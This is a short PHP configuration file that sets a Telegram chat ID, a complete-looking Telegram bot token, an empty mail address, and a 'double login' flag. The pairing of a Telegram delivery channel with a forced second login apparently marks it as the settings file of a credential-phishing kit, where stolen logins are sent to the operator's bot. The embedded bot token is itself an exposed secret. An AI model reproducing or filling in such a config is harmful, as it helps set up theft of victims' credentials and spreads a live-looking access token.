<?php
$mail="";
$telegram_chat_id="1175946341";
$telegram_bot_token="5196903380:AAHW9CmL9mPHhWHC0UIq2SRU7Abf6l7L9dg";
$relogin=1;// set to one if you want double login

?>